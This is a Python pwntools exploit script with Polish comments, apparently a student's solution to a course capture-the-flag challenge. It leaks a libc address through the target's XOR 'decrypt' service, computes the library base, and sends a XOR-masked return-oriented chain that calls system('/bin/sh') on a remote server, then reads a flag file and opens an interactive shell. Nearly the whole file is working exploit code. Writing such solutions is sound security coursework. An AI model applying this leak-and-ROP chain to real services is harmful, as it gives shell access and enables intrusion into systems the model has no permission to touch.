#!/usr/bin/env python3
from pwn import *

# exe = ELF("./easy")
# exe = ELF("./medium")
# hard chall is dynamically linked, so here's helper
# patched version to load proper ld and libc
exe = ELF("./hard_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

# "gdb libc.so.6" i następnie polecenie "p/x &system" otzrymuje SYSTEM offste
SYSTEM_OFF = 0x55230
# strings -tx libc.so.6 | grep '/bin/sh' i otzrymuje BIN_SH offset
BIN_SH_OFF = 0x1c041b
# ROPgadget --binary libc.so.6 | grep 'pop rdi' i mamy POP_RDI offset
POP_RDI_OFF = 0x0000000000028715
# przy uzyciu gdb na hard testowo znalazłem adres bazowy libc. Wykorzystałem go potem do odjęcia od
# wyciekniętego adresu. Mimo że biblioteka libc jest ładowana nie zawsze na ten sam adres ale offset pozostaje ten sam    
OFFSET = 0x0000000000028189

context.binary = exe
index_number = b"438753"

def conn():
    r = remote("bsk.bonus.re", 13337)
    return r
    
def main():
    r = conn()
    
    # Wysyłamy numer indeksu i poziom trudności(hard)
    msg = index_number + b"\n" + b"1\n"
    r.send(msg)

    #Wysyłamy 256 bajtów ponieważ przy pomocy gdb wykorzystując metodę prób 
    #i błedów ustawiając breakpointy znalazłem ze hard woła funkcje _libc_start_main wlasnie 256 bajtow na stosie
    msg = b"0\n" + b"256\n" + b"\x00" * 256 + b"\n"
    r.send(msg)
    r.recvuntil(b"decrypted data:\n")
    first_recive = r.recvn(256)

    #jak na labach 5
    libc_pom = u64(first_recive[-8:]) - OFFSET

    # Doxoruje wszytsko z wartosciami uzyskanymi ze stosu zeby potem jak znowu zxoruje to zeby na stosie byly moje wartsoci.
    # ponieważ odwrotnością xora jest xor.
    msg = b"\x00" * 56
    # Wyłącznie po to żeby wyrównać stos wynika to z potrzeby żę x64 ABi ma wymagania wrównania stosu do 8 modulo 16
    msg += xor(p64(libc_pom + POP_RDI_OFF + 1), first_recive[56:64])
    # Jak na labach w zadaniu 5 bierzemy z libc aby dostać dostęp do bin/sh
    msg += xor(p64(libc_pom + POP_RDI_OFF), first_recive[64:72])
    msg += xor(p64(libc_pom + BIN_SH_OFF), first_recive[72:80])
    msg += xor(p64(libc_pom + SYSTEM_OFF), first_recive[80:88])

    # Wysyłamy tak samo jak w easy. Podmienimy na stosie na wczesnie załadowane dane
    msg2 = b"0\n" + b"88\n" + msg + b"\n"

    r.send(msg2)
    r.recvuntil(b"decrypted data:\n")
    r.recvn(88)
    
    # Robimy zapytanie na już na bin/sh po szukana przez nas flage 
    r.send(b"cat /tmp/flag.txt\n")

    r.interactive()

if __name__ == "__main__":
    main()